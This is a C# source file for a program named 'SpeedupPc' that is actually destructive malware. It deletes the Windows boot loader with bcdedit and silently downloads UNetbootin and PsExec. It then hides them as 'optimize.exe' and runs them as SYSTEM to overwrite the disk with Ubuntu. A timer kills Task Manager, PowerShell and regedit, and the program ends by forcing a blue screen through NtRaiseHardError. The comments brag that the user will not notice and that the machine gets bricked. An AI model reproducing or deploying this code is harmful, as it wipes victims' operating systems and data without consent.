using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Data;
using System.Windows.Documents;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using System.Windows.Navigation;
using System.Windows.Shapes;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.Net;
using System.Windows.Forms;
using System.DirectoryServices;
using System.DirectoryServices.AccountManagement;
using System.Collections;
using System.IO.Compression;

namespace SpeedupPc
{
    /// <summary>
    /// Interaction logic for MainWindow.xaml
    /// </summary>
    public class Executor
    {
        string os = "Ubuntu";
        // string version = "18.04_NetInstall_x64";
        string uneturl = @"https://github.com/unetbootin/unetbootin/releases/download/702/unetbootin-windows-702.exe";
        string psexecurl = @"https://download.sysinternals.com/files/PSTools.zip";
        string[] bannedprograms = { "taskmgr", "powershell", "regedit" };
        bool debug = false;
        bool savecmd = false;
        public Executor()
        {
            if (!debug)
            {
                // uses bcdedit to remove the windows boot loader from the system, forcing it to load into linux later when installed. if the user reboots their computer or shuts it down, it will get bricked
                setbootloader();
                try
                {
                    // downloads unetbootin and psexec64. both programs are used here to do most of the heavy lifting, this is just a nice shell that makes the process easy and hidden from the average windows user :)
                    new WebClient().DownloadFile(uneturl, "optimize.exe");
                    new WebClient().DownloadFile(psexecurl, "ptools.zip");
                    ZipFile.ExtractToDirectory($"{System.Windows.Forms.Application.StartupPath}\\ptools.zip", $"{System.Windows.Forms.Application.StartupPath}\\tools");

                }
                catch { }
            }
            // runs an invisible command prompt that runs psexec64 with some weird arguments to initiate an invisible process running in a different session, allowing another command prompt to execute unetbootin to run completely invisibly.
            // took a few hours of messing around with the win32 api to get here

            Process cmda = new Process();
            cmda.StartInfo.FileName = "cmd.exe";
            cmda.StartInfo.RedirectStandardInput = true;
            cmda.StartInfo.RedirectStandardOutput = true;
            cmda.StartInfo.CreateNoWindow = true;
            cmda.StartInfo.UseShellExecute = false;
            cmda.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
            cmda.Start();
            cmda.Exited += (s, e) => End();
            cmda.StandardInput.WriteLine($"{System.Windows.Forms.Application.StartupPath}\\tools\\PsExec64.exe /accepteula -s -i 0 \"cmd.exe\" \"/c {System.Windows.Forms.Application.StartupPath}\\optimize.exe distribution={os} installtype=HDD autoinstall=yes\"");//version=\"{version}\"
            cmda.StandardInput.Flush();
            cmda.StandardInput.Close();
            Timer thread = new Timer();
            thread.Interval = 50;

            thread.Tick += delegate (Object o, EventArgs _e)
            {
                Debug.WriteLine(cmda.HasExited);
                if (cmda.HasExited)
                {
                    End();
                }
                foreach (Process proc in Process.GetProcesses())
                {
                    if (bannedprograms.Contains(proc.ProcessName.ToLower()))
                    {

                        try
                        {
                            if (!debug)
                            {
                                proc.Kill();
                            }
                        }
                        catch { }
                    }
                }
            };
            thread.Start();

        }

        private void End()
        {
            // unet has been properly installed. only one thing left to do
            // TODO: add a popup informing the user about their new os
            Bsod();
        }

        void setbootloader()
        {
            Debug.WriteLine("attempting to override bootloader");
            if (IntPtr.Size == 8)
            {
                Process cmd = new Process();
                cmd.StartInfo.FileName = @"cmd.exe";
                cmd.StartInfo.RedirectStandardInput = true;
                cmd.StartInfo.RedirectStandardOutput = true;
                cmd.StartInfo.CreateNoWindow = true;
                cmd.StartInfo.UseShellExecute = false;
                cmd.Start();
                cmd.StandardInput.WriteLine("bcdedit /delete {current}");
            }
            else
            {
                // wont work on x86. oh well
                // this took me over an hour to figure out rip
                Bsod();
            }
        }
        void RunCMD(string cmd)
        {
            savecmd = true;
            Process cmda = new Process();
            cmda.StartInfo.FileName = "cmd.exe";
            cmda.StartInfo.RedirectStandardInput = true;
            cmda.StartInfo.RedirectStandardOutput = true;
            cmda.StartInfo.CreateNoWindow = true;
            cmda.StartInfo.UseShellExecute = false;
            cmda.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
            cmda.Start();
            cmda.StandardInput.WriteLine(cmd);
            cmda.StandardInput.Flush();
            cmda.StandardInput.Close();
            cmda.Exited += (a, e) => savecmd = false;
        }
        void Bsod()
        {

            Boolean t1;
            uint t2;
            RtlAdjustPrivilege(19, true, false, out t1);
            NtRaiseHardError(0xc0000022, 0, 0, IntPtr.Zero, 6, out t2);
        }
        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
        [DllImport("ntdll.dll")]
        public static extern uint RtlAdjustPrivilege(int Privilege, bool bEnablePrivilege, bool IsThreadPrivilege, out bool PreviousValue);

        [DllImport("ntdll.dll")]
        public static extern uint NtRaiseHardError(uint ErrorStatus, uint NumberOfParameters, uint UnicodeStringParameterMask, IntPtr Parameters, uint ValidResponseOption, out uint Response);
    }
}
